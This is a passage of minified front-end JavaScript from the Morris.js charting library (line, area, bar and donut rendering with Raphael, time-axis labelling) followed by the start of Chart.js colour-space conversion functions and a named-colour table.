: function () { for (var t = this.data, e = [], n = 0, i = t.length; n < i; n++)o = t[n], e.push([o.label, o.x]); return e }.call(this); for (A.reverse(), i = [], e = 0, n = A.length; e < n; e++)t = A[e], i.push((a = t[0], s = t[1], c = l = g = r = void 0, c = u.drawXAxisLabel(u.transX(s), h, a), I = c.getBBox(), c.transform("r" + -u.options.xLabelAngle), r = c.getBBox(), c.transform("t0," + r.height / 2 + "..."), 0 !== u.options.xLabelAngle && (l = -.5 * I.width * Math.cos(u.options.xLabelAngle * Math.PI / 180), c.transform("t" + l + ",0...")), r = c.getBBox(), (null == d || d >= r.x + r.width || null != C && C >= r.x) && 0 <= r.x && r.x + r.width < u.el.width() ? (0 !== u.options.xLabelAngle && (g = 1.25 * u.options.gridTextSize / Math.sin(u.options.xLabelAngle * Math.PI / 180), C = r.x - g), d = r.x - u.options.xLabelMargin) : c.remove())); return i }, m.prototype.drawSeries = function () { var t, e, n, i, o, a; for (this.seriesPoints = [], t = e = i = this.options.ykeys.length - 1; i <= 0 ? e <= 0 : 0 <= e; t = i <= 0 ? ++e : --e)this._drawLineFor(t); for (a = [], t = n = o = this.options.ykeys.length - 1; o <= 0 ? n <= 0 : 0 <= n; t = o <= 0 ? ++n : --n)a.push(this._drawPointFor(t)); return a }, m.prototype._drawPointFor = function (t) { var e, n, i, o, a, s; for (this.seriesPoints[t] = [], s = [], i = 0, o = (a = this.data).length; i < o; i++)(e = null) != (n = a[i])._y[t] && (e = this.drawLinePoint(n._x, n._y[t], this.colorFor(n, t, "point"), t)), s.push(this.seriesPoints[t].push(e)); return s }, m.prototype._drawLineFor = function (t) { var e = this.paths[t]; if (null !== e) return this.drawLinePath(e, this.colorFor(null, t, "line"), t) }, m.createPath = function (t, e, n) { var i, o, a, s, r, g, l, c, I, u = ""; for (e && (a = y.Line.gradients(t)), l = { y: null }, s = c = 0, I = t.length; c < I; s = ++c)null != (i = t[s]).y && (null != l.y ? e ? (o = a[s], g = a[s - 1], r = (i.x - l.x) / 4, u += "C" + (l.x + r) + "," + Math.min(n, l.y + r * g) + "," + (i.x - r) + "," + Math.min(n, i.y - r * o) + "," + i.x + "," + i.y) : u += "L" + i.x + "," + i.y : e && null == a[s] || (u += "M" + i.x + "," + i.y)), l = i; return u }, m.gradients = function (t) { for (var e, n, i, o, a = function (t, e) { return (t.y - e.y) / (t.x - e.x) }, s = [], r = o = 0, g = t.length; o < g; r = ++o)null != (e = t[r]).y ? (n = t[r + 1] || { y: null }, null != (i = t[r - 1] || { y: null }).y && null != n.y ? s.push(a(i, n)) : null != i.y ? s.push(a(i, e)) : null != n.y ? s.push(a(e, n)) : s.push(null)) : s.push(null); return s }, m.prototype.hilight = function (t) { var e, n, i, o, a; if (null !== this.prevHilight && this.prevHilight !== t) for (e = n = 0, o = this.seriesPoints.length - 1; 0 <= o ? n <= o : o <= n; e = 0 <= o ? ++n : --n)this.seriesPoints[e][this.prevHilight] && this.seriesPoints[e][this.prevHilight].animate(this.pointShrinkSeries(e)); if (null !== t && this.prevHilight !== t) for (e = i = 0, a = this.seriesPoints.length - 1; 0 <= a ? i <= a : a <= i; e = 0 <= a ? ++i : --i)this.seriesPoints[e][t] && this.seriesPoints[e][t].animate(this.pointGrowSeries(e)); return this.prevHilight = t }, m.prototype.colorFor = function (t, e, n) { return "function" == typeof this.options.lineColors ? this.options.lineColors.call(this, t, e, n) : "point" === n && this.options.pointFillColors[e % this.options.pointFillColors.length] || this.options.lineColors[e % this.options.lineColors.length] }, m.prototype.drawXAxisLabel = function (t, e, n) { return this.raphael.text(t, e, n).attr("font-size", this.options.gridTextSize).attr("font-family", this.options.gridTextFamily).attr("font-weight", this.options.gridTextWeight).attr("fill", this.options.gridTextColor) }, m.prototype.drawLinePath = function (t, e, n) { return this.raphael.path(t).attr("stroke", e).attr("stroke-width", this.lineWidthForSeries(n)) }, m.prototype.drawLinePoint = function (t, e, n, i) { return this.raphael.circle(t, e, this.pointSizeForSeries(i)).attr("fill", n).attr("stroke-width", this.pointStrokeWidthForSeries(i)).attr("stroke", this.pointStrokeColorForSeries(i)) }, m.prototype.pointStrokeWidthForSeries = function (t) { return this.options.pointStrokeWidths[t % this.options.pointStrokeWidths.length] }, m.prototype.pointStrokeColorForSeries = function (t) { return this.options.pointStrokeColors[t % this.options.pointStrokeColors.length] }, m.prototype.lineWidthForSeries = function (t) { return this.options.lineWidth instanceof Array ? this.options.lineWidth[t % this.options.lineWidth.length] : this.options.lineWidth }, m.prototype.pointSizeForSeries = function (t) { return this.options.pointSize instanceof Array ? this.options.pointSize[t % this.options.pointSize.length] : this.options.pointSize }, m.prototype.pointGrowSeries = function (t) { return Raphael.animation({ r: this.pointSizeForSeries(t) + 3 }, 25, "linear") }, m.prototype.pointShrinkSeries = function (t) { return Raphael.animation({ r: this.pointSizeForSeries(t) }, 25, "linear") }, m), y.labelSeries = function (t, e, n, i, o) { var a, s, r, g, l, c, I, u, h = 200 * (e - t) / n, d = new Date(t), C = y.LABEL_SPECS[i]; if (void 0 === C) for (c = 0, I = (u = y.AUTO_LABEL_ORDER).length; c < I; c++)if (s = u[c], h >= (g = y.LABEL_SPECS[s]).span) { C = g; break } for (void 0 === C && (C = y.LABEL_SPECS.second), o && (C = A.extend({}, C, { fmt: o })), a = C.start(d), r = []; (l = a.getTime()) <= e;)t <= l && r.push([C.fmt(a), l]), C.incr(a); return r }, e = function (e) { return { span: 60 * e * 1e3, start: function (t) { return new Date(t.getFullYear(), t.getMonth(), t.getDate(), t.getHours()) }, fmt: function (t) { return y.pad2(t.getHours()) + ":" + y.pad2(t.getMinutes()) }, incr: function (t) { return t.setUTCMinutes(t.getUTCMinutes() + e) } } }, n = function (e) { return { span: 1e3 * e, start: function (t) { return new Date(t.getFullYear(), t.getMonth(), t.getDate(), t.getHours(), t.getMinutes()) }, fmt: function (t) { return y.pad2(t.getHours()) + ":" + y.pad2(t.getMinutes()) + ":" + y.pad2(t.getSeconds()) }, incr: function (t) { return t.setUTCSeconds(t.getUTCSeconds() + e) } } }, y.LABEL_SPECS = { decade: { span: 1728e8, start: function (t) { return new Date(t.getFullYear() - t.getFullYear() % 10, 0, 1) }, fmt: function (t) { return "" + t.getFullYear() }, incr: function (t) { return t.setFullYear(t.getFullYear() + 10) } }, year: { span: 1728e7, start: function (t) { return new Date(t.getFullYear(), 0, 1) }, fmt: function (t) { return "" + t.getFullYear() }, incr: function (t) { return t.setFullYear(t.getFullYear() + 1) } }, month: { span: 24192e5, start: function (t) { return new Date(t.getFullYear(), t.getMonth(), 1) }, fmt: function (t) { return t.getFullYear() + "-" + y.pad2(t.getMonth() + 1) }, incr: function (t) { return t.setMonth(t.getMonth() + 1) } }, week: { span: 6048e5, start: function (t) { return new Date(t.getFullYear(), t.getMonth(), t.getDate()) }, fmt: function (t) { return t.getFullYear() + "-" + y.pad2(t.getMonth() + 1) + "-" + y.pad2(t.getDate()) }, incr: function (t) { return t.setDate(t.getDate() + 7) } }, day: { span: 864e5, start: function (t) { return new Date(t.getFullYear(), t.getMonth(), t.getDate()) }, fmt: function (t) { return t.getFullYear() + "-" + y.pad2(t.getMonth() + 1) + "-" + y.pad2(t.getDate()) }, incr: function (t) { return t.setDate(t.getDate() + 1) } }, hour: e(60), "30min": e(30), "15min": e(15), "10min": e(10), "5min": e(5), minute: e(1), "30sec": n(30), "15sec": n(15), "10sec": n(10), "5sec": n(5), second: n(1) }, y.AUTO_LABEL_ORDER = ["decade", "year", "month", "week", "day", "hour", "30min", "15min", "10min", "5min", "minute", "30sec", "15sec", "10sec", "5sec", "second"], y.Area = (a = y.Line, t(f, a), s = { fillOpacity: "auto", behaveLikeLine: !1 }, f.prototype.calcPoints = function () { for (var o, a, s, t = this.data, e = [], n = 0, i = t.length; n < i; n++)(o = t[n])._x = this.transX(o.x), a = 0, o._y = function () { for (var t = o.y, e = [], n = 0, i = t.length; n < i; n++)s = t[n], this.options.behaveLikeLine ? e.push(this.transY(s)) : (a += s || 0, e.push(this.transY(a))); return e }.call(this), e.push(o._ymax = Math.max.apply(Math, o._y)); return e }, f.prototype.drawSeries = function () { var t, e, n, i, o, a, s, r; for (this.seriesPoints = [], r = [], n = 0, i = (e = this.options.behaveLikeLine ? function () { a = []; for (var t = 0, e = this.options.ykeys.length - 1; 0 <= e ? t <= e : e <= t; 0 <= e ? t++ : t--)a.push(t); return a }.apply(this) : function () { s = []; for (var t = o = this.options.ykeys.length - 1; o <= 0 ? t <= 0 : 0 <= t; o <= 0 ? t++ : t--)s.push(t); return s }.apply(this)).length; n < i; n++)t = e[n], this._drawFillFor(t), this._drawLineFor(t), r.push(this._drawPointFor(t)); return r }, f.prototype._drawFillFor = function (t) { var e = this.paths[t]; if (null !== e) return e = e + ("L" + this.transX(this.xmax) + "," + this.bottom + "L" + this.transX(this.xmin) + "," + this.bottom) + "Z", this.drawFilledPath(e, this.fillForSeries(t)) }, f.prototype.fillForSeries = function (t) { var e = Raphael.rgb2hsl(this.colorFor(this.data[t], t, "line")); return Raphael.hsl(e.h, this.options.behaveLikeLine ? .9 * e.s : .75 * e.s, Math.min(.98, this.options.behaveLikeLine ? 1.2 * e.l : 1.25 * e.l)) }, f.prototype.drawFilledPath = function (t, e) { return this.raphael.path(t).attr("fill", e).attr("fill-opacity", this.options.fillOpacity).attr("stroke", "none") }, f), y.Bar = (r = y.Grid, t(b, r), b.prototype.init = function () { if (this.cumulative = this.options.stacked, "always" !== this.options.hideHover) return this.hover = new y.Hover({ parent: this.el }), this.on("hovermove", this.onHoverMove), this.on("hoverout", this.onHoverOut), this.on("gridclick", this.onGridClick) }, b.prototype.defaults = { barSizeRatio: .75, barGap: 3, barColors: ["#0b62a4", "#7a92a3", "#4da74d", "#afd8f8", "#edc240", "#cb4b4b", "#9440ed"], barOpacity: 1, barRadius: [0, 0, 0, 0], xLabelMargin: 50 }, b.prototype.calc = function () { var t; if (this.calcBars(), !1 === this.options.hideHover) return (t = this.hover).update.apply(t, this.hoverContentForRow(this.data.length - 1)) }, b.prototype.calcBars = function () { for (var o, a, t, e = this.data, n = [], i = t = 0, s = e.length; t < s; i = ++t)(o = e[i])._x = this.left + this.width * (i + .5) / this.data.length, n.push(o._y = function () { for (var t = o.y, e = [], n = 0, i = t.length; n < i; n++)null != (a = t[n]) ? e.push(this.transY(a)) : e.push(null); return e }.call(this)); return n }, b.prototype.draw = function () { var t; return !0 !== (t = this.options.axes) && "both" !== t && "x" !== t || this.drawXAxis(), this.drawSeries() }, b.prototype.drawXAxis = function () { for (var t, e, n, i, o, a, s, r = this.bottom + (this.options.xAxisLabelTopPadding || this.options.padding / 2), g = null, l = null, c = [], I = s = 0, u = this.data.length; 0 <= u ? s < u : u < s; I = 0 <= u ? ++s : --s)o = this.data[this.data.length - 1 - I], a = (t = this.drawXAxisLabel(o._x, r, o.label)).getBBox(), t.transform("r" + -this.options.xLabelAngle), e = t.getBBox(), t.transform("t0," + e.height / 2 + "..."), 0 !== this.options.xLabelAngle && (i = -.5 * a.width * Math.cos(this.options.xLabelAngle * Math.PI / 180), t.transform("t" + i + ",0...")), (null == g || g >= e.x + e.width || null != l && l >= e.x) && 0 <= e.x && e.x + e.width < this.el.width() ? (0 !== this.options.xLabelAngle && (n = 1.25 * this.options.gridTextSize / Math.sin(this.options.xLabelAngle * Math.PI / 180), l = e.x - n), c.push(g = e.x - this.options.xLabelMargin)) : c.push(t.remove()); return c }, b.prototype.drawSeries = function () { var o, a, s, r, g, l, c, I, t, u, h, d, C = this.width / this.options.data.length, e = this.options.stacked ? 1 : this.options.ykeys.length, A = (C * this.options.barSizeRatio - this.options.barGap * (e - 1)) / e; return this.options.barSize && (A = Math.min(A, this.options.barSize)), t = C - A * e - this.options.barGap * (e - 1), g = t / 2, d = this.ymin <= 0 && 0 <= this.ymax ? this.transY(0) : null, this.bars = function () { var t, e, n = this.data, i = []; for (a = t = 0, e = n.length; t < e; a = ++t)l = n[a], s = 0, i.push(function () { var t, e, n = l._y, i = []; for (c = t = 0, e = n.length; t < e; c = ++t)null !== (h = n[c]) ? (o = d ? (u = Math.min(h, d), Math.max(h, d)) : (u = h, this.bottom), r = this.left + a * C + g, this.options.stacked || (r += c * (A + this.options.barGap)), I = o - u, this.options.verticalGridCondition && this.options.verticalGridCondition(l.x) && this.drawBar(this.left + a * C, this.top, C, Math.abs(this.top - this.bottom), this.options.verticalGridColor, this.options.verticalGridOpacity, this.options.barRadius), this.options.stacked && (u -= s), this.drawBar(r, u, A, I, this.colorFor(l, c, "bar"), this.options.barOpacity, this.options.barRadius), i.push(s += I)) : i.push(null); return i }.call(this)); return i }.call(this) }, b.prototype.colorFor = function (t, e, n) { var i, o; return "function" == typeof this.options.barColors ? (i = { x: t.x, y: t.y[e], label: t.label }, o = { index: e, key: this.options.ykeys[e], label: this.options.labels[e] }, this.options.barColors.call(this, i, o, n)) : this.options.barColors[e % this.options.barColors.length] }, b.prototype.hitTest = function (t) { return 0 === this.data.length ? null : (t = Math.max(Math.min(t, this.right), this.left), Math.min(this.data.length - 1, Math.floor((t - this.left) / (this.width / this.data.length)))) }, b.prototype.onGridClick = function (t, e) { var n = this.hitTest(t); return this.fire("click", n, this.data[n].src, t, e) }, b.prototype.onHoverMove = function (t, e) { var n, i = this.hitTest(t); return (n = this.hover).update.apply(n, this.hoverContentForRow(i)) }, b.prototype.onHoverOut = function () { if (!1 !== this.options.hideHover) return this.hover.hide() }, b.prototype.hoverContentForRow = function (t) { for (var e, n, i = this.data[t], o = "<div class='morris-hover-row-label'>" + i.label + "</div>", a = i.y, s = n = 0, r = a.length; n < r; s = ++n)e = a[s], o += "<div class='morris-hover-point' style='color: " + this.colorFor(i, s, "label") + "'>\n  " + this.options.labels[s] + ":\n  " + this.yLabelFormat(e) + "\n</div>"; return "function" == typeof this.options.hoverCallback && (o = this.options.hoverCallback(t, this.options, o, i.src)), [o, this.left + (t + .5) * this.width / this.data.length] }, b.prototype.drawXAxisLabel = function (t, e, n) { return this.raphael.text(t, e, n).attr("font-size", this.options.gridTextSize).attr("font-family", this.options.gridTextFamily).attr("font-weight", this.options.gridTextWeight).attr("fill", this.options.gridTextColor) }, b.prototype.drawBar = function (t, e, n, i, o, a, s) { var r = Math.max.apply(Math, s), g = 0 === r || i < r ? this.raphael.rect(t, e, n, i) : this.raphael.path(this.roundedRect(t, e, n, i, s)); return g.attr("fill", o).attr("fill-opacity", a).attr("stroke", "none") }, b.prototype.roundedRect = function (t, e, n, i, o) { return null == o && (o = [0, 0, 0, 0]), ["M", t, o[0] + e, "Q", t, e, t + o[0], e, "L", t + n - o[1], e, "Q", t + n, e, t + n, e + o[1], "L", t + n, e + i - o[2], "Q", t + n, e + i, t + n - o[2], e + i, "L", t + o[3], e + i, "Q", t, e + i, t, e + i - o[3], "Z"] }, b), y.Donut = (g = y.EventEmitter, t(B, g), B.prototype.defaults = { colors: ["#0B62A4", "#3980B5", "#679DC6", "#95BBD7", "#B0CCE1", "#095791", "#095085", "#083E67", "#052C48", "#042135"], backgroundColor: "#FFFFFF", labelColor: "#000000", formatter: y.commas, resize: !1 }, B.prototype.redraw = function () { var t, e, n, i, o, a, s, r, g, l, c, I, u, h, d, C, A, p, m, f, b, B; for (this.raphael.clear(), e = this.el.width() / 2, n = this.el.height() / 2, I = (Math.min(e, n) - 10) / 3, u = c = 0, C = (m = this.values).length; u < C; u++)c += m[u]; for (r = 5 / (2 * I), t = 1.9999 * Math.PI - r * this.data.length, o = a = 0, this.segments = [], i = h = 0, A = (f = this.values).length; h < A; i = ++h)g = a + r + f[i] / c * t, (l = new y.DonutSegment(e, n, 2 * I, I, a, g, this.data[i].color || this.options.colors[o % this.options.colors.length], this.options.backgroundColor, o, this.raphael)).render(), this.segments.push(l), l.on("hover", this.select), l.on("click", this.click), a = g, o += 1; for (this.text1 = this.drawEmptyDonutLabel(e, n - 10, this.options.labelColor, 15, 800), this.text2 = this.drawEmptyDonutLabel(e, 10 + n, this.options.labelColor, 14), s = Math.max.apply(Math, this.values), B = [], d = o = 0, p = (b = this.values).length; d < p; d++) { if (b[d] === s) { this.select(o); break } B.push(o += 1) } return B }, B.prototype.setData = function (t) { var o; return this.data = t, this.values = function () { for (var t = this.data, e = [], n = 0, i = t.length; n < i; n++)o = t[n], e.push(parseFloat(o.value)); return e }.call(this), this.redraw() }, B.prototype.click = function (t) { return this.fire("click", t, this.data[t]) }, B.prototype.select = function (t) { for (var e, n = this.segments, i = 0, o = n.length; i < o; i++)n[i].deselect(); return this.segments[t].select(), e = this.data[t], this.setLabels(e.label, this.options.formatter(e.value, e)) }, B.prototype.setLabels = function (t, e) { var n, i, o, a, s = 2 * (Math.min(this.el.width() / 2, this.el.height() / 2) - 10) / 3, r = 1.8 * s, g = s / 2, l = s / 3; return this.text1.attr({ text: t, transform: "" }), n = this.text1.getBBox(), i = Math.min(r / n.width, g / n.height), this.text1.attr({ transform: "S" + i + "," + i + "," + (n.x + n.width / 2) + "," + (n.y + n.height) }), this.text2.attr({ text: e, transform: "" }), o = this.text2.getBBox(), a = Math.min(r / o.width, l / o.height), this.text2.attr({ transform: "S" + a + "," + a + "," + (o.x + o.width / 2) + "," + o.y }) }, B.prototype.drawEmptyDonutLabel = function (t, e, n, i, o) { var a = this.raphael.text(t, e, "").attr("font-size", i).attr("fill", n); return null != o && a.attr("font-weight", o), a }, B.prototype.resizeHandler = function () { return this.timeoutId = null, this.raphael.setSize(this.el.width(), this.el.height()), this.redraw() }, B), y.DonutSegment = (l = y.EventEmitter, t(v, l), v.prototype.calcArcPoints = function (t) { return [this.cx + t * this.sin_p0, this.cy + t * this.cos_p0, this.cx + t * this.sin_p1, this.cy + t * this.cos_p1] }, v.prototype.calcSegment = function (t, e) { var n = this.calcArcPoints(t), i = n[0], o = n[1], a = n[2], s = n[3], r = this.calcArcPoints(e), g = r[0], l = r[1], c = r[2], I = r[3]; return "M" + i + "," + o + "A" + t + "," + t + ",0," + this.is_long + ",0," + a + "," + s + "L" + c + "," + I + "A" + e + "," + e + ",0," + this.is_long + ",1," + g + "," + l + "Z" }, v.prototype.calcArc = function (t) { var e = this.calcArcPoints(t), n = e[0], i = e[1], o = e[2], a = e[3]; return "M" + n + "," + i + "A" + t + "," + t + ",0," + this.is_long + ",0," + o + "," + a }, v.prototype.render = function () { var t = this; return this.arc = this.drawDonutArc(this.hilight, this.color), this.seg = this.drawDonutSegment(this.path, this.color, this.backgroundColor, function () { return t.fire("hover", t.index) }, function () { return t.fire("click", t.index) }) }, v.prototype.drawDonutArc = function (t, e) { return this.raphael.path(t).attr({ stroke: e, "stroke-width": 2, opacity: 0 }) }, v.prototype.drawDonutSegment = function (t, e, n, i, o) { return this.raphael.path(t).attr({ fill: e, stroke: n, "stroke-width": 3 }).hover(i).click(o) }, v.prototype.select = function () { if (!this.selected) return this.seg.animate({ path: this.selectedPath }, 150, "<>"), this.arc.animate({ opacity: 1 }, 150, "<>"), this.selected = !0 }, v.prototype.deselect = function () { if (this.selected) return this.seg.animate({ path: this.path }, 150, "<>"), this.arc.animate({ opacity: 0 }, 150, "<>"), this.selected = !1 }, v) }.call(this), function (t, e) { "object" == typeof exports && "undefined" != typeof module ? module.exports = e() : "function" == typeof define && define.amd ? define(e) : t.Chart = e() }(this, function () { "use strict"; var o = { rgb2hsl: a, rgb2hsv: e, rgb2hwb: n, rgb2cmyk: i, rgb2keyword: s, rgb2xyz: l, rgb2lab: c, rgb2lch: function (t) { return m(c(t)) }, hsl2rgb: I, hsl2hsv: function (t) { var e = t[0], n = t[1] / 100, i = t[2] / 100; return 0 !== i ? [e, 100 * (2 * (n *= (i *= 2) <= 1 ? i : 2 - i) / (i + n)), 100 * ((i + n) / 2)] : [0, 0, 0] }, hsl2hwb: function (t) { return n(I(t)) }, hsl2cmyk: function (t) { return i(I(t)) }, hsl2keyword: function (t) { return s(I(t)) }, hsv2rgb: u, hsv2hsl: function (t) { var e, n, i = t[0], o = t[1] / 100, a = t[2] / 100; return e = o * a, [i, 100 * (e = (e /= (n = (2 - o) * a) <= 1 ? n : 2 - n) || 0), 100 * (n /= 2)] }, hsv2hwb: function (t) { return n(u(t)) }, hsv2cmyk: function (t) { return i(u(t)) }, hsv2keyword: function (t) { return s(u(t)) }, hwb2rgb: h, hwb2hsl: function (t) { return a(h(t)) }, hwb2hsv: function (t) { return e(h(t)) }, hwb2cmyk: function (t) { return i(h(t)) }, hwb2keyword: function (t) { return s(h(t)) }, cmyk2rgb: d, cmyk2hsl: function (t) { return a(d(t)) }, cmyk2hsv: function (t) { return e(d(t)) }, cmyk2hwb: function (t) { return n(d(t)) }, cmyk2keyword: function (t) { return s(d(t)) }, keyword2rgb: y, keyword2hsl: function (t) { return a(y(t)) }, keyword2hsv: function (t) { return e(y(t)) }, keyword2hwb: function (t) { return n(y(t)) }, keyword2cmyk: function (t) { return i(y(t)) }, keyword2lab: function (t) { return c(y(t)) }, keyword2xyz: function (t) { return l(y(t)) }, xyz2rgb: C, xyz2lab: A, xyz2lch: function (t) { return m(A(t)) }, lab2xyz: p, lab2rgb: f, lab2lch: m, lch2lab: B, lch2xyz: function (t) { return p(B(t)) }, lch2rgb: function (t) { return f(B(t)) } }; function a(t) { var e, n, i = t[0] / 255, o = t[1] / 255, a = t[2] / 255, s = Math.min(i, o, a), r = Math.max(i, o, a), g = r - s; return r == s ? e = 0 : i == r ? e = (o - a) / g : o == r ? e = 2 + (a - i) / g : a == r && (e = 4 + (i - o) / g), (e = Math.min(60 * e, 360)) < 0 && (e += 360), n = (s + r) / 2, [e, 100 * (r == s ? 0 : n <= .5 ? g / (r + s) : g / (2 - r - s)), 100 * n] } function e(t) { var e, n = t[0], i = t[1], o = t[2], a = Math.min(n, i, o), s = Math.max(n, i, o), r = s - a, g = 0 == s ? 0 : r / s * 1e3 / 10; return s == a ? e = 0 : n == s ? e = (i - o) / r : i == s ? e = 2 + (o - n) / r : o == s && (e = 4 + (n - i) / r), (e = Math.min(60 * e, 360)) < 0 && (e += 360), [e, g, s / 255 * 1e3 / 10] } function n(t) { var e = t[0], n = t[1], i = t[2]; return [a(t)[0], 100 * (1 / 255 * Math.min(e, Math.min(n, i))), 100 * (i = 1 - 1 / 255 * Math.max(e, Math.max(n, i)))] } function i(t) { var e = t[0] / 255, n = t[1] / 255, i = t[2] / 255, o = Math.min(1 - e, 1 - n, 1 - i); return [100 * ((1 - e - o) / (1 - o) || 0), 100 * ((1 - n - o) / (1 - o) || 0), 100 * ((1 - i - o) / (1 - o) || 0), 100 * o] } function s(t) { return x[JSON.stringify(t)] } function l(t) { var e = t[0] / 255, n = t[1] / 255, i = t[2] / 255; return [100 * (.4124 * (e = .04045 < e ? Math.pow((e + .055) / 1.055, 2.4) : e / 12.92) + .3576 * (n = .04045 < n ? Math.pow((n + .055) / 1.055, 2.4) : n / 12.92) + .1805 * (i = .04045 < i ? Math.pow((i + .055) / 1.055, 2.4) : i / 12.92)), 100 * (.2126 * e + .7152 * n + .0722 * i), 100 * (.0193 * e + .1192 * n + .9505 * i)] } function c(t) { var e = l(t), n = e[0], i = e[1], o = e[2]; return i /= 100, o /= 108.883, n = .008856 < (n /= 95.047) ? Math.pow(n, 1 / 3) : 7.787 * n + 16 / 116, [116 * (i = .008856 < i ? Math.pow(i, 1 / 3) : 7.787 * i + 16 / 116) - 16, 500 * (n - i), 200 * (i - (o = .008856 < o ? Math.pow(o, 1 / 3) : 7.787 * o + 16 / 116))] } function I(t) { var e, n, i, o, a, s = t[0] / 360, r = t[1] / 100, g = t[2] / 100; if (0 == r) return [a = 255 * g, a, a]; e = 2 * g - (n = g < .5 ? g * (1 + r) : g + r - g * r), o = [0, 0, 0]; for (var l = 0; l < 3; l++)(i = s + 1 / 3 * -(l - 1)) < 0 && i++, 1 < i && i--, a = 6 * i < 1 ? e + 6 * (n - e) * i : 2 * i < 1 ? n : 3 * i < 2 ? e + (n - e) * (2 / 3 - i) * 6 : e, o[l] = 255 * a; return o } function u(t) { var e = t[0] / 60, n = t[1] / 100, i = t[2] / 100, o = Math.floor(e) % 6, a = e - Math.floor(e), s = 255 * i * (1 - n), r = 255 * i * (1 - n * a), g = 255 * i * (1 - n * (1 - a)), i = 255 * i; switch (o) { case 0: return [i, g, s]; case 1: return [r, i, s]; case 2: return [s, i, g]; case 3: return [s, r, i]; case 4: return [g, s, i]; case 5: return [i, s, r] } } function h(t) { var e, n, i, o, a = t[0] / 360, s = t[1] / 100, l = t[2] / 100, c = s + l; switch (1 < c && (s /= c, l /= c), i = 6 * a - (e = Math.floor(6 * a)), 0 != (1 & e) && (i = 1 - i), o = s + i * ((n = 1 - l) - s), e) { default: case 6: case 0: r = n, g = o, b = s; break; case 1: r = o, g = n, b = s; break; case 2: r = s, g = n, b = o; break; case 3: r = s, g = o, b = n; break; case 4: r = o, g = s, b = n; break; case 5: r = n, g = s, b = o }return [255 * r, 255 * g, 255 * b] } function d(t) { var e = t[0] / 100, n = t[1] / 100, i = t[2] / 100, o = t[3] / 100; return [255 * (1 - Math.min(1, e * (1 - o) + o)), 255 * (1 - Math.min(1, n * (1 - o) + o)), 255 * (1 - Math.min(1, i * (1 - o) + o))] } function C(t) { var e = t[0] / 100, n = t[1] / 100, i = t[2] / 100, o = 3.2406 * e + -1.5372 * n + -.4986 * i, a = -.9689 * e + 1.8758 * n + .0415 * i, s = .0557 * e + -.204 * n + 1.057 * i; return o = .0031308 < o ? 1.055 * Math.pow(o, 1 / 2.4) - .055 : o *= 12.92, a = .0031308 < a ? 1.055 * Math.pow(a, 1 / 2.4) - .055 : a *= 12.92, s = .0031308 < s ? 1.055 * Math.pow(s, 1 / 2.4) - .055 : s *= 12.92, [255 * (o = Math.min(Math.max(0, o), 1)), 255 * (a = Math.min(Math.max(0, a), 1)), 255 * (s = Math.min(Math.max(0, s), 1))] } function A(t) { var e = t[0], n = t[1], i = t[2]; return n /= 100, i /= 108.883, e = .008856 < (e /= 95.047) ? Math.pow(e, 1 / 3) : 7.787 * e + 16 / 116, [116 * (n = .008856 < n ? Math.pow(n, 1 / 3) : 7.787 * n + 16 / 116) - 16, 500 * (e - n), 200 * (n - (i = .008856 < i ? Math.pow(i, 1 / 3) : 7.787 * i + 16 / 116))] } function p(t) { var e, n = t[0], i = t[1], o = t[2], a = n <= 8 ? (e = 100 * n / 903.3) / 100 * 7.787 + 16 / 116 : (e = 100 * Math.pow((n + 16) / 116, 3), Math.pow(e / 100, 1 / 3)), s = s / 95.047 <= .008856 ? s = 95.047 * (i / 500 + a - 16 / 116) / 7.787 : 95.047 * Math.pow(i / 500 + a, 3), r = r / 108.883 <= .008859 ? r = 108.883 * (a - o / 200 - 16 / 116) / 7.787 : 108.883 * Math.pow(a - o / 200, 3); return [s, e, r] } function m(t) { var e = t[0], n = t[1], i = t[2], o = 360 * Math.atan2(i, n) / 2 / Math.PI; return o < 0 && (o += 360), [e, Math.sqrt(n * n + i * i), o] } function f(t) { return C(p(t)) } function B(t) { var e = t[0], n = t[1], i = t[2] / 360 * 2 * Math.PI; return [e, n * Math.cos(i), n * Math.sin(i)] } function y(t) { return v[t] } var v = { aliceblue: [240, 248, 255], antiquewhite: [250, 235, 215], aqua: [0, 255, 255], aquamarine: [127, 255, 212], azure: [240, 255, 255], beige: [245, 245, 220], bisque: [255, 228, 196], black: [0, 0, 0], blanchedalmond: [255, 235, 205], blue: [0, 0, 255], blueviolet: [138, 43, 226], brown: [165, 42, 42], burlywood: [222, 184, 135], cadetblue: [95, 158, 160], chartreuse: [127, 255, 0], chocolate: [210, 105, 30], coral: [255, 127, 80], cornflowerblue: [100, 149, 237], cornsilk: [255, 248, 220], crimson: [220, 20, 60], cyan: [0, 255, 255], darkblue: [0, 0, 139], darkcyan: [0, 139, 139], darkgoldenrod: [184, 134, 11], darkgray: [169, 169, 169], darkgreen: [0, 100, 0], darkgrey: [169, 169, 169], darkkhaki: [189, 183, 107], darkmagenta: [139, 0, 139], darkolivegreen: [85, 107, 47], darkorange: [255, 140, 0], darkorchid: [153, 50, 204], darkred: [139, 0, 0], darksalmon: [233, 150, 122], darkseagreen: [143, 188, 143], darkslateblue: [72, 61, 139], darkslategray: [47, 79, 79], darkslategrey: [47, 79, 79], darkturquoise: [0, 206, 209], darkviolet: [148, 0, 211], deeppink: [255, 20, 147], deepskyblue: [0, 191, 255], dimgray: [105, 105, 105], dimgrey: [105, 105, 105], dodgerblue: [30, 144, 255], firebrick: [178, 34, 34], floralwhite: [255, 250, 240], forestgreen: [34, 139, 34], fuchsia: [255, 0, 255], gainsboro: [220, 220, 220], ghostwhite: [248, 248, 255], gold: [255, 215, 0], goldenrod: [218, 165, 32], gray: [128, 128, 128], green: [0, 128, 0], greenyellow: [173, 255, 47], grey: [128, 128, 128], honeydew: [240, 255, 240], hotpink: [255, 105, 180], indianred: [205, 92, 92], indigo: [75, 0, 130], ivory: [255, 255, 240], khaki: [240, 230, 140], lavender: [230, 230, 250], lavenderblush: [255, 240, 245], lawngreen: [124, 252, 0], lemonchiffon: [255, 250, 205], lightblue: [173, 216, 230], lightcoral: [240, 128, 128], lightcyan: [224, 255, 255], lightgoldenrodyellow: [250, 250, 210], lightgray: [211, 211, 211], lightgreen: [144, 238, 144], lightgrey: [211, 211, 211], lightpink: [255, 182, 193], lightsalmon: [255, 160, 122], lightseagreen: [32, 178, 170], lightskyblue: [135, 206, 250], lightslategray: [119, 136, 153], lightslategrey: [119, 136, 153], lightsteelblue: [176, 196, 222], lightyellow: [255, 255, 224], lime: [0, 255, 0], limegreen: [50, 205, 50], linen: [250, 240, 230], magenta: [255, 0, 255], maroon: [128, 0, 0], mediumaquamarine: [102, 205, 170], mediumblue: [0, 0, 205], mediumorchid: [186, 85, 211], mediumpurple: [147, 112, 219], 